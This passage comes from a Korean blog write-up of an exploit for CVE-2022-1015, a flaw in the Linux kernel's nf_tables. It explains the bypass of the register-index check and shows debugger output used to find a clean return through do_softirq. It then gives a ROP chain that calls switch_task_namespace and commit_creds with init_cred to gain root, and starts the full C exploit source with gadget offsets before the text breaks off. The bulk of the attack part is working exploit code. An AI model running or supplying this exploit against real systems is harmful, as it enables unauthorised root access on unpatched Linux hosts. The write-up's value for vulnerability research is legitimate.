</span></span><span style="display:flex;"><span>	NFT_PAYLOAD_TRANSPORT_HEADER,
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>이때 base 세팅해서 확인도 가능.</p>
<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">nft_parse_register</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> nlattr <span style="color:#f92672">*</span>attr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> reg;
</span></span><span style="display:flex;"><span>	reg <span style="color:#f92672">=</span> <span style="color:#a6e22e">ntohl</span>(<span style="color:#a6e22e">nla_get_be32</span>(attr));
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">switch</span> (reg) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">case</span> NFT_REG_VERDICT...NFT_REG_4:
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> reg <span style="color:#f92672">*</span> NFT_REG_SIZE <span style="color:#f92672">/</span> NFT_REG32_SIZE;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> reg <span style="color:#f92672">+</span> NFT_REG_SIZE <span style="color:#f92672">/</span> NFT_REG32_SIZE <span style="color:#f92672">-</span> NFT_REG32_00;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>-4 한 상태로 들어간다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">nft_validate_register_load</span>(<span style="color:#66d9ef">enum</span> nft_registers reg, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> len)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (reg <span style="color:#f92672">&lt;</span> NFT_REG_1 <span style="color:#f92672">*</span> NFT_REG_SIZE <span style="color:#f92672">/</span> NFT_REG32_SIZE)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (len <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>EINVAL;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (reg <span style="color:#f92672">*</span> NFT_REG32_SIZE <span style="color:#f92672">+</span> len <span style="color:#f92672">&gt;</span> <span style="color:#a6e22e">sizeof_field</span>(<span style="color:#66d9ef">struct</span> nft_regs, data))
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span>ERANGE;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#a6e22e">print</span>(<span style="color:#a6e22e">hex</span>(((<span style="color:#ae81ff">0xffffff00</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0xe8</span>)<span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0x70</span>))<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>))
</span></span></code></pre></div><p>이런식으로 bypass 된다.
들어갈때 -4 해서 들어가니 잘 고려해주고, idx도 4 곱해진다는 걸 고려해서 릭을 할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>	 <span style="color:#ae81ff">0xffffffff82000195</span> <span style="color:#f92672">&lt;</span>__do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">405</span><span style="color:#f92672">&gt;</span>    jne    __do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">650</span>            <span style="color:#f92672">&lt;</span>__do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">650</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0xffffffff8200019b</span> <span style="color:#f92672">&lt;</span>__do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">411</span><span style="color:#f92672">&gt;</span>    mov    edx, dword ptr [rbp <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x44</span>]   
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0xffffffff8200019e</span> <span style="color:#f92672">&lt;</span>__do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">414</span><span style="color:#f92672">&gt;</span>    mov    rax, qword ptr gs:[<span style="color:#ae81ff">0x1fbc0</span>]
</span></span></code></pre></div><p>__do_softirq 부분 정상적으로 종료 어디서 되는지 확인해보고, 이때 여기서 뭘 집어넣길래 이부분이 키 복구하는 쪽이라는 것을 알았다.
그래서 rbp-0x44의 정상적인 값을 찾았고, 그걸로 집어넣으면 된다.
<img loading="lazy" src="/blog/CVE-2022-1015_Linux_kernel/9ef871f7e4cf25395c1f11d73ddc0e93.png" alt=""  />

마지막 부분에 soft_irq가 돌아가는 부분이 있어서 ROP 체인 실행시키고 나서 얘를 이용해서 나가면 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">40</span>xi <span style="color:#ae81ff">0xffffffff810bd765</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0xffffffff810bd765</span> <span style="color:#f92672">&lt;</span>do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">117</span><span style="color:#f92672">&gt;:</span> pop    rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0xffffffff810bd766</span> <span style="color:#f92672">&lt;</span>do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">118</span><span style="color:#f92672">&gt;:</span> mov    BYTE PTR gs:[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x7ef62416</span>],<span style="color:#ae81ff">0x0</span>        <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">0x1fb84</span> <span style="color:#f92672">&lt;</span>hardirq_stack_inuse<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0xffffffff810bd76e</span> <span style="color:#f92672">&lt;</span>do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">126</span><span style="color:#f92672">&gt;:</span> and    bh,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0xffffffff810bd771</span> <span style="color:#f92672">&lt;</span>do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">129</span><span style="color:#f92672">&gt;:</span> je     <span style="color:#ae81ff">0xffffffff810bd72c</span> <span style="color:#f92672">&lt;</span>do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0xffffffff810bd773</span> <span style="color:#f92672">&lt;</span>do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">131</span><span style="color:#f92672">&gt;:</span> sti
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0xffffffff810bd774</span> <span style="color:#f92672">&lt;</span>do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">132</span><span style="color:#f92672">&gt;:</span> nop    WORD PTR [rax<span style="color:#f92672">+</span>rax<span style="color:#f92672">*</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x0</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0xffffffff810bd77a</span> <span style="color:#f92672">&lt;</span>do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">138</span><span style="color:#f92672">&gt;:</span> mov    rbx,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0xffffffff810bd77e</span> <span style="color:#f92672">&lt;</span>do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">142</span><span style="color:#f92672">&gt;:</span> leave
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0xffffffff810bd77f</span> <span style="color:#f92672">&lt;</span>do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">143</span><span style="color:#f92672">&gt;:</span> ret
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0xffffffff810bd780</span> <span style="color:#f92672">&lt;</span>do_softirq<span style="color:#f92672">+</span><span style="color:#ae81ff">144</span><span style="color:#f92672">&gt;:</span> call   <span style="color:#ae81ff">0xffffffff810df6</span>
</span></span></code></pre></div><p>pop rsp해줘서 돌아가는데, 이때 rbp까지 같이 맞춰주면 정상적으로 돌아갈 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>		<span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> cur_stack <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3f88</span>; i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> cliret; i<span style="color:#f92672">++</span>;    
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> prbp;i<span style="color:#f92672">++</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> cur_stack<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3f60</span>;i<span style="color:#f92672">++</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100016d</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40010000000000</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>)<span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40010000000000</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40010000000000</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40010000000000</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40010000000000</span>;i<span style="color:#f92672">++</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40010000000000</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400100</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400100</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400100</span>;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> cur_stack<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3f58</span>;i<span style="color:#f92672">++</span>; <span style="color:#75715e">//sfp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> cur_stack<span style="color:#f92672">+</span><span style="color:#ae81ff">0x3f58</span>;i<span style="color:#f92672">++</span>; <span style="color:#75715e">//r15
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> bpf_get_current_task;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> movrdirax;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> prsi;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> data_base <span style="color:#f92672">+</span> data_init_nsproxy;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> switch_task_namespace;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> prdi;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> data_base <span style="color:#f92672">+</span> data_init_cred;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> commit_creds;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> ret;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> ret;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> ret;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> ret;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> ret;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> ret;i<span style="color:#f92672">++</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(udpbuf<span style="color:#f92672">+</span>i<span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> go;i<span style="color:#f92672">++</span>;
</span></span></code></pre></div><p>다음과 같은 체인을 이용해 미리 cli를 호출해주고, __do_softirq 부분 뒷부분을 많이 짤라서 편하게 할 수 있다.
그리고 권한 상승후 do_softirq로 나가줬다.</p>
<h3 id="exploit-code">Exploit code<a hidden class="anchor" aria-hidden="true" href="#exploit-code">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#define _GNU_SOURCE
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stddef.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;utils.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define prdi 0xa4f20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define prsi 0xfd61e
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define prdx 0x66a40
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define pushrax 0x463d5
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define ret 0x1fc
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define prbp 0x802
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define stiret 0x65e115 </span><span style="color:#75715e">// dec ecx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define cliret 0x5ec83a 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define bpf_get_current_task 0x217de0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define movrdirax 0x625d74 </span><span style="color:#75715e">// 0xffffffff81625d74 : mov rdi, rax ; jne 0xffffffff81625d61 ; xor eax, eax ; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define data_init_nsproxy 0x202060
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define switch_task_namespace 0xe5c80
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define data_init_cred 0x2022a0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define commit_creds 0xe74a0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define go 0x22c92 </span><span style="color:#75715e">//  add rsp, 0x10 ; pop r12 ; pop r13 ; pop rbp ; ret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span><span style="color:#a6e22e">isolate_udp_pkt</span>(<span style="color:#66d9ef">uint8_t</span> family, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>table, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>chain, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> target_chain)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint16_t</span> port <span style="color:#f92672">=</span> <span style="color:#ae81ff">8888</span>;
</span></span><span style="display:flex;"><span>	r <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_rule_alloc</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (r <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;OOM&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_set_str</span>(r, NFTNL_RULE_TABLE, table);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_set_str</span>(r, NFTNL_RULE_CHAIN, chain);
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">nftnl_rule_set_u32</span>(r, NFTNL_RULE_FAMILY, family);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// meta load l4proto =&gt; reg 1 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">add_meta</span>(r, NFT_META_L4PROTO, NFT_REG_1); 
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint8_t</span> v <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">add_cmp</span>(r,NFT_REG_1 ,NFT_CMP_EQ,<span style="color:#f92672">&amp;</span>v,<span style="color:#66d9ef">sizeof</span>(v));
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">add_payload</span>(r, NFT_PAYLOAD_TRANSPORT_HEADER, <span style="color:#ae81ff">0</span>,NFT_REG32_01, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">uint16_t</span> dport <span style="color:#f92672">=</span> <span style="color:#a6e22e">htons</span>(port); 	
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">add_cmp</span>(r,NFT_REG32_01, NFT_CMP_EQ , <span style="color:#f92672">&amp;</span>dport, <span style="color:#66d9ef">sizeof</span>(dport));
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">add_verdict</span>(r, NFT_JUMP, target_chain, NFT_REG_VERDICT);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// TODO
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> r;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span><span style="color:#a6e22e">edit_udp_data</span>(<span style="color:#66d9ef">uint8_t</span> family, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>table, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>chain)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> nftnl_rule <span style="color:#f92672">*</span>r <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>	r <span style="color:#f92672">=</span> <span style="color:#a6e22e">nftnl_rule_alloc</span>();
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (r <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">perror</span>(<span style="color:#e6db74">&#34;OOM&#34;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(EXIT_FAILURE);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// enum nft_payload_bases {
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 	NFT_PAYLOAD_LL_HEADER,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 	NFT_PAYLOAD_NETWORK_HEADER,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// 	NFT_PAYLOAD_TRANSPORT_HEADER,
